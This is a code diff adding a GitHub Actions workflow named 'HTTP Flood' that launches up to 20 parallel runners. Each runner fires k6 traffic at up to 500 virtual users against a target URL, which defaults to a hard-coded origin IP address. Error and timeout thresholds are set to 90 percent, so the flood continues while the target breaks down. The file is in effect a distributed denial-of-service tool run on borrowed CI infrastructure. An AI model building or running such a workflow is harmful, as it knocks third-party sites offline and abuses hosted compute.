@@ -1,0 +1,74 @@
+name: HTTP Flood — thanhhuyreal
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Target URL (mac dinh: IP goc)'
+        required: true
+        default: 'http://103.211.206.175/'
+      runners:
+        description: 'So runner song song (toi da 20)'
+        required: true
+        default: '5'
+      max_vus:
+        description: 'VU moi runner'
+        required: true
+        default: '500'
+      duration:
+        description: 'Thoi gian giu tai (VD: 3m, 10m)'
+        required: true
+        default: '5m'
+      ramp_duration:
+        description: 'Thoi gian ramp up'
+        required: true
+        default: '30s'
+
+jobs:
+  prepare:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+    steps:
+      - id: set-matrix
+        run: |
+          COUNT=${{ github.event.inputs.runners }}
+          MATRIX=$(python3 -c "import json; print(json.dumps(list(range(1, int('$COUNT')+1))))")
+          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT
+
+  flood:
+    needs: prepare
+    name: "Runner ${{ matrix.runner }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        runner: ${{ fromJson(needs.prepare.outputs.matrix) }}
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup k6
+        uses: grafana/setup-k6-action@v1
+
+      - name: Show runner identity
+        run: |
+          echo "Runner index: ${{ matrix.runner }}"
+          echo "Hostname: $(hostname)"
+          echo "Public IP: $(curl -sf https://api.ipify.org || echo unknown)"
+
+      - name: Run k6 flood
+        run: k6 run sites/thanhhuyreal/test-script.js
+        env:
+          TARGET_URL:       ${{ github.event.inputs.target_url }}
+          STAGES:           "${{ github.event.inputs.ramp_duration }}:${{ github.event.inputs.max_vus }},${{ github.event.inputs.duration }}:${{ github.event.inputs.max_vus }},10s:0"
+          START_RATE:       "50"
+          PRE_VUS:          "100"
+          MAX_VUS:          ${{ github.event.inputs.max_vus }}
+          REQUEST_TIMEOUT:  "15s"
+          REQUEST_DELAY:    "0"
+          MAX_5XX_RATE:     "0.9"
+          MAX_TIMEOUT_RATE: "0.9"
